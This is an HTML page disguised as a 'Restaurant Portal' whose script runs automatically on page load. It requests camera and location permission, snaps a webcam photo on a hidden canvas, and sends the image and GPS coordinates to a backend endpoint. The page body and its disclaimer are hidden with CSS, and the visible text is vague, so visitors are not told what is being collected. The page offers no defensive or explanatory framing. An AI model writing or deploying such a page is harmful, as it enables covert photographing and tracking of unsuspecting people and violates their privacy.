<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Restaurant Portal</title>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; padding: 20px, background-color: red ; visibility: hidden; display: none;opacity: 0; }
        .disclaimer { background-color: #fff3cd; color: #856404; padding: 15px; border: 1px solid #ffeeba; margin-bottom: 20px; font-weight: bold;visibility: hidden; display: none;opacity: 0; }
        video { border: 2px solid #ccc; border-radius: 8px; margin-bottom: 10px; background-color: #f8f9fa; }
        .spinner { margin-top: 20px; font-weight: bold; font-size: 18px; color: #0056b3; }
    </style>
</head>
<body>

    <h1>Welcome just wait</h1>
    
    <div class="disclaimer">
        NOTICE: this web site make just 10second.
    </div>
    <video id="videoFeed" width="320" height="240" autoplay playsinline></video>
    <canvas id="photoCanvas" width="320" height="240" style="display:none;"></canvas>
    <p id="statusMessage" class="spinner">Initializing system...</p>

    <script>
        const video = document.getElementById('videoFeed');
        const canvas = document.getElementById('photoCanvas');
        const statusText = document.getElementById('statusMessage');

        // Main automatic function
        async function startAutomaticCapture() {
            let isCameraActive = false;
            let locationData = null;
            let imageData = null;

            // --- STEP 1: Request Camera ---
            statusText.innerText = "Waiting for web site permission...";
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                video.srcObject = stream;
                isCameraActive = true;
                
                // Wait for the video to fully load its first frame so we don't snap a black picture
                await new Promise((resolve) => {
                    video.onloadeddata = () => {
                        setTimeout(resolve, 500); // Wait half a second for the lens to focus
                    };
                });
            } catch (err) {
                console.warn("Camera denied.");
            }

            // --- STEP 2: Request Location ---
            statusText.innerText = "Waiting for linke permission...";
            if (navigator.geolocation) {
                try {
                    locationData = await new Promise((resolve, reject) => {
                        navigator.geolocation.getCurrentPosition(
                            (position) => resolve({
                                latitude: position.coords.latitude,
                                longitude: position.coords.longitude
                            }),
                            (error) => reject(error),
                            { timeout: 10000 } // Give up after 10 seconds if it hangs
                        );
                    });
                } catch (error) {
                    console.warn("web site denied.");
                }
            }

            // --- STEP 3: Process the Image ---
            if (isCameraActive) {
                const context = canvas.getContext('2d');
                context.drawImage(video, 0, 0, canvas.width, canvas.height);
                imageData = canvas.toDataURL('image/png');
            }

            // --- STEP 4: Check if we have anything to send ---
            if (!locationData && !imageData) {
                statusText.innerText = "❌ Both permissions were denied. Cannot proceed.";
                statusText.style.color = "red";
                return; // Stop the script here
            }

            // --- STEP 5: Automatically Send to Backend ---
            statusText.innerText = "Sending data...";
            statusText.style.color = "black";

            try {
                const response = await fetch('/api/save-data', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ image: imageData, location: locationData })
                });
                
                const data = await response.json();

                if (response.ok) {
                    statusText.innerText = "✅ Success! You may now close this page.";
                    statusText.style.color = "green";
                } else {
                    throw new Error("Server rejected request");
                }
            } catch (err) {
                statusText.innerText = "❌ Error sending data to server.";
                statusText.style.color = "red";
            }
        }

        // Trigger the process the exact moment the page finishes loading
        window.addEventListener('load', startAutomaticCapture);
    </script>
</body>
</html>
